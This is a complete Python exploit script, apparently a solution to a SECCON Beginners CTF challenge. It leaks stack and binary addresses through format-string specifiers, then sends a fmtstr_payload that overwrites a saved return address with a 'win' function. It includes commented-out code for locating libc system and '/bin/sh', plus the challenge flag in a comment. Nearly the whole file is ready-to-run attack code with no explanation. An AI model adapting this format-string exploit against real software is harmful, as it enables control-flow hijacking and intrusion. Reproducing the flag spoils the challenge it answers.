#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'forgot-some-exploit.beginners.seccon.games', 'port':9002})
env.select()

#==========

binf = ELF(bin_file)
ofs_main            = binf.sep_function['main']

'''
libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_read           = libc.sep_function['read']
'''

#==========

def attack(conn, **kwargs):

    conn.sendline(b'%1$p %3$p %45$p')
    addrs = list(map(lambda x: int(x, 16), conn.recvline().split()))

    addr_stack, addr_libc_read, addr_main = addrs[0], addrs[1]-0x12, addrs[2]

    binf.address = addr_main - ofs_main
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))
    addr_win            = binf.sep_function['win']

    '''
    libc.address = addr_libc_read - ofs_libc_read
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))
    '''

    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    overwrite = {}
    overwrite[addr_stack+0x118] = addr_win
    payload = fmtstr_payload(6, overwrite, write_size = 'short')
    conn.sendline(payload)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # ctf4b{4ny_w4y_y0u_w4nt_1t}

if __name__=='__main__':
    main()

#==========
